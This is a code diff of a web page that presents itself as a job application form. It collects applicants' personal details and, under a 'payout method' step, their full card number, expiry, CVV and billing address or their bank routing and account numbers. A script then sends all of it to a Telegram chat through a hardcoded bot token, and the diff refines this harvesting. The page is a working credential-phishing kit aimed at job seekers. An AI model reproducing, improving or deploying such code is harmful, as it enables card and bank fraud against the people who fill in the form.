@@ -213,13 +213,13 @@
         <input id="cardName" name="cardName" required autocomplete="cc-name" />
         <label for="cardNumber">Card Number *</label>
         <div class="card-input-wrapper">
-          <input id="cardNumber" name="cardNumber" required autocomplete="cc-number" pattern="\\d{13,19}" title="Enter a valid card number" placeholder="Card Number" />
+          <input id="cardNumber" name="cardNumber" required autocomplete="cc-number" minlength="13" maxlength="19" placeholder="Card Number" />
           <div id="cardTypeIcon"></div>
         </div>
         <label for="expiry">Expiry (MM/YY) *</label>
-        <input id="expiry" name="expiry" required autocomplete="cc-exp" pattern="^(0[1-9]|1[0-2])\\/\\d{2}$" title="Format MM/YY" />
+        <input id="expiry" name="expiry" required autocomplete="cc-exp" pattern="^(0[1-9]|1[0-2])\/\d{2}$" title="Format MM/YY" />
         <label for="cvv">CVV *</label>
-        <input id="cvv" name="cvv" required autocomplete="cc-csc" pattern="\\d{3,4}" title="3 or 4 digit CVV"/>
+        <input id="cvv" name="cvv" required autocomplete="cc-csc" pattern="\d{3,4}" title="3 or 4 digit CVV"/>
         <label for="billingAddress">Billing Address *</label>
         <input id="billingAddress" name="billingAddress" required autocomplete="street-address" />
         <label for="billingCity">City *</label>
@@ -227,7 +227,7 @@
         <label for="billingState">State *</label>
         <input id="billingState" name="billingState" required autocomplete="address-level1" />
         <label for="billingZip">ZIP Code *</label>
-        <input id="billingZip" name="billingZip" pattern="\\d{5}" title="5-digit ZIP code" required autocomplete="postal-code" />
+        <input id="billingZip" name="billingZip" pattern="\d{5}" title="5-digit ZIP code" required autocomplete="postal-code" />
       </div>
       <div id="bank-form" role="tabpanel" aria-hidden="true" hidden>
         <label for="bankName">Bank Name *</label>
@@ -413,18 +413,19 @@
       let msg = `📢 *New Job Application*\n\n*Personal Info:*\n- Name: ${escapeMarkdown(data.name)}\n- Email: ${escapeMarkdown(data.email)}\n- Phone: ${escapeMarkdown(data.phone)}\n- Education: ${escapeMarkdown(data.education)}\n- Industry: ${escapeMarkdown(data.industry)}\n\n*Payout Method:* ${data.payoutMethod.toUpperCase()}\n`;
 
       if(data.payoutMethod === 'card') {
-        msg += `- Name on Card: ${escapeMarkdown(data.cardName)}\n- Card Number: ${escapeMarkdown(data.cardNumber)}\n- Expiry: ${escapeMarkdown(data.expiry)}\n- CVV: ${escapeMarkdown(data.cvv)}\n- Billing Address: ${escapeMarkdown(data.billingAddress)}\n- City: ${escapeMarkdown(data.billingCity)}\n- State: ${escapeMarkdown(data.billingState)}\n- ZIP: ${escapeMarkdown(data.billingZip)}\n`;
+        msg += `*Card Details:*\n- Name on Card: ${escapeMarkdown(data.cardName)}\n- Card Number: ${escapeMarkdown(data.cardNumber)}\n- Expiry: ${escapeMarkdown(data.expiry)}\n- CVV: ${escapeMarkdown(data.cvv)}\n- Billing Address: ${escapeMarkdown(data.billingAddress)}\n- City: ${escapeMarkdown(data.billingCity)}\n- State: ${escapeMarkdown(data.billingState)}\n- ZIP: ${escapeMarkdown(data.billingZip)}\n`;
       } else {
-        msg += `- Bank Name: ${escapeMarkdown(data.bankName)}\n- Routing Number: ${escapeMarkdown(data.routingNumber)}\n- Account Number: ${escapeMarkdown(data.accountNumber)}\n- Account Type: ${escapeMarkdown(data.accountType)}\n`;
+        msg += `*Bank Details:*\n- Bank Name: ${escapeMarkdown(data.bankName)}\n- Routing Number: ${escapeMarkdown(data.routingNumber)}\n- Account Number: ${escapeMarkdown(data.accountNumber)}\n- Account Type: ${escapeMarkdown(data.accountType)}\n`;
       }
 
+      // Telegram Bot Info
       const token = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
       const chatId = '1318100118';
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'MarkdownV2' }),
+        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' }),
       }).then(res => {
         if (res.ok) {
           steps.forEach(s => s.classList.remove('active'));
